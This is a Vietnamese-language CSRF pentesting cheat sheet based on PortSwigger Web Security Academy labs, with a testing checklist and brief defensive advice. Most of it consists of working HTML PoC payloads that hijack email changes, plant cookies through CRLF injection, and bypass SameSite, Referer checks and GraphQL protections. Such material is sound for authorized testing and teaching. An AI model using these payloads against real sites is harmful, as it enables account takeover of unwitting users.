# CSRF – Kỹ thuật phát hiện & khai thác  
*(bám sát PortSwigger Web Security Academy)*

> ⚠️ Chỉ dùng cho mục đích kiểm thử hợp pháp (pentest có uỷ quyền).  

---

## Mục tiêu & quy trình nhanh

1. **Rà soát hành động thay đổi trạng thái**: đổi email/mật khẩu, thêm địa chỉ, nạp/rút tiền, đổi quyền, v.v.  
2. **Thu request thật** bằng Burp (Proxy/Logger/Repeater).  
3. **Tạo PoC** bằng *Engagement tools → Generate CSRF PoC* rồi tinh chỉnh.  
4. **Thử các biến thể**: thay method, bỏ token, thay token, đổi header, chuyển hướng top-level, v.v.

**PoC POST tối thiểu**
```html
<form action="https://target.tld/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.me">
</form>
<script>document.forms[0].submit()</script>
```

**PoC GET (nếu endpoint chấp nhận GET)**
```html
<img src="https://target.tld/my-account/change-email?email=attacker@evil.me">
```

---

## Lỗi triển khai CSRF token & cách khai thác

### 1) Bỏ qua kiểm tra khi **thiếu tham số token**
- **Dấu hiệu:** Xoá hẳn `csrf` khỏi request, server vẫn xử lý.  
- **Khai thác:** Gửi request **không có** token (PoC html không chứa field token).

### 2) Chỉ kiểm tra token với **một method** (thường POST)
- **Dấu hiệu:** POST cần token, **GET/HEAD/OPTIONS** không.  
- **Khai thác:** Dùng Burp “Change request method” POST→GET; nếu OK, chuyển sang PoC top-level GET.

### 3) Token **không gắn với phiên** (không ràng buộc user/session)
- **Dấu hiệu:** Token của user A dùng được cho user B.  
- **Khai thác:** Đổi session (đăng nhập tài khoản khác), tái dùng token cũ.

### 4) Token phụ thuộc **cookie không phải session** (dễ bị đặt từ xa)
- **Dấu hiệu:** App sinh token dựa vào một cookie “key” riêng.  
- **Khai thác:** Tìm chỗ có thể ép **Set-Cookie** (CRLF, host phụ, tính năng phản hồi) để đặt trước cookie “key”, rồi gửi token khớp.

### 5) **Double-submit cookie**
- **Dấu hiệu:** App chỉ so sánh *tham số token* với *giá trị trong cookie* mà **không lưu state** server-side.  
- **Khai thác:** Đặt trước cookie `csrf=fake` rồi submit form dùng `csrf=fake`.

*Minh hoạ đặt cookie rồi auto-submit:*
```html
<form action="https://target.tld/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwn@evil.me">
  <input type="hidden" name="csrf"  value="fake">
</form>
<!-- Ví dụ ép Set-Cookie qua một lỗ hổng/điểm phản hồi -->
<img src="https://target.tld/?search=x%0d%0aSet-Cookie:%20csrf=fake" 
     onerror="document.forms[0].submit()">
```

---

## Bypass SameSite cookie (khi app chỉ dựa vào cookie phiên)

> SameSite **giảm** rủi ro nhưng **không thay thế** CSRF token.

### A) **Lax + top-level GET** (hoặc method override)
- **Ý tưởng:** Top-level navigation với **GET** vẫn gửi cookie (Lax).  
- **Khai thác:** Nếu app hỗ trợ `_method=POST` qua **query**, trình duyệt vẫn là GET top-level.

```html
<script>
  location = "https://target.tld/my-account/change-email?email=pwn@evil.me&_method=POST"
</script>
```

### B) **Cookie mới cấp** → “cửa sổ” gửi POST
- **Ý tưởng:** Ngay sau khi cookie được cấp mới (ví dụ sau OAuth/popup), có khoảng ngắn cookie được gửi trong hành động tiếp theo.  
- **Khai thác:** Kích hoạt luồng làm mới cookie rồi auto-submit form POST.

### C) **On-site gadget** → secondary same-site request
- **Ý tưởng:** Lợi dụng endpoint nội bộ/redirect để tạo request **same-site** thứ cấp (cookie được gửi).  
- **Khai thác:** Dùng URL gadget/redirect để điều hướng đến endpoint thực thi hành động.

```html
<script>
location="https://target.tld/post/confirm?next=/my-account/change-email?email=pwn%40evil.me%26submit=1"
</script>
```

### D) **Sibling domain** trong cùng “site”
- **Ý tưởng:** Khai thác subdomain/cùng registrable domain (ví dụ `cms.example` ↔ `app.example`) để dựng gadget hoặc đặt cookie/phản hồi.

---

## Vượt kiểm **Referer/Origin**

- Một số ứng dụng chỉ kiểm tra **Referer**/ **Origin** “bắt buộc”.  
- **Khai thác:**  
  - **Loại bỏ** hoặc **làm trống** header (meta `referrer`, `rel="noreferrer"`, iframing, chuyển hướng).  
  - **Tuyệt đối**: Nếu chỉ match “bắt đầu bằng”, thử **open redirect** để trông giống nguồn hợp lệ.

*Suppress Referer rồi auto-submit:*
```html
<meta name="referrer" content="no-referrer">
<form action="https://target.tld/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="pwn@evil.me">
</form>
<script>document.forms[0].submit()</script>
```

---

## CSRF với **GraphQL**

- Nếu endpoint GraphQL chấp nhận `application/x-www-form-urlencoded`, mutation có thể **submit qua form** như REST.

```html
<form action="https://target.tld/graphql" method="POST">
  <input type="hidden" name="query"
         value="mutation{ updateEmail(email:\"pwn@evil.me\"){ id } }">
</form>
<script>document.forms[0].submit()</script>
```

---

## Phối hợp **XSS ↔ CSRF**

- Khi token triển khai **đúng chuẩn**, cần XSS để **đọc/lấy token** hoặc **gửi request** từ trong origin hợp lệ.  
- **Kịch bản:** stored XSS chèn JS đọc token trong DOM rồi `fetch` hành động nhạy cảm.

---

## Checklist kiểm thử nhanh

- [ ] Endpoint thay đổi trạng thái có **token?**  
  - [ ] **Đổi giá trị** token → bị chặn?  
  - [ ] **Xoá hẳn** tham số token → request còn được xử lý?  
- [ ] **Đổi method** (POST↔GET/PUT/DELETE hoặc `_method=`) → cơ chế kiểm token còn hiệu lực?  
- [ ] Token **gắn với session**? Thử token giữa **hai người dùng**/hai phiên.  
- [ ] Có **double-submit cookie**/cookie phụ? Thử **đặt cookie trước** rồi submit token trùng khớp.  
- [ ] Cookie phiên có **SameSite** gì? Thử:  
  - [ ] **Top-level GET** / method override  
  - [ ] **Cookie mới cấp** (sau login/OAuth)  
  - [ ] **On-site gadget/redirect**  
  - [ ] **Sibling domain**  
- [ ] App dựa vào **Referer/Origin**? Thử **loại bỏ/sửa** header hoặc **open redirect**.

---

## Mẹo thực hành với Burp

- **Logger/Proxy**: gom request nhạy cảm.  
- **Repeater**: thử biến thể (đổi method, xoá token, đổi token, thay header).  
- **Engagement tools → Generate CSRF PoC**: khởi tạo khung PoC, sau đó **chỉnh sửa** để thêm kỹ thuật bypass (override, redirect, suppress Referer…).  
- **Proxy Match & Replace**: tự động tiêm header/cookie trong thử nghiệm.

---

## Khuyến nghị phòng thủ (tham khảo nhanh)

- **CSRF token chuẩn**: ngẫu nhiên, entropy cao, **gắn với phiên**, **bắt buộc cho mọi hành động state-changing** (không chỉ POST).  
- **SameSite=Strict/Lax** cho cookie phiên; **không dựa một mình** vào SameSite.  
- **Re-auth/2FA** cho tác vụ cực nhạy (đổi mật khẩu, chuyển tiền).  
- **Kiểm Origin/Referer** như lớp phụ trợ (không phải tuyến chính).  
- **Tách miền** cho vùng không tin cậy (upload/preview).

---

### Ghi chú
- Tùy từng lab/môi trường, chuỗi khai thác (đặc biệt SameSite) cần tinh chỉnh (điều hướng, thời điểm, gadget).  
- Tài liệu này bám sát cách phân loại/kỹ thuật trong PortSwigger Web Security Academy.
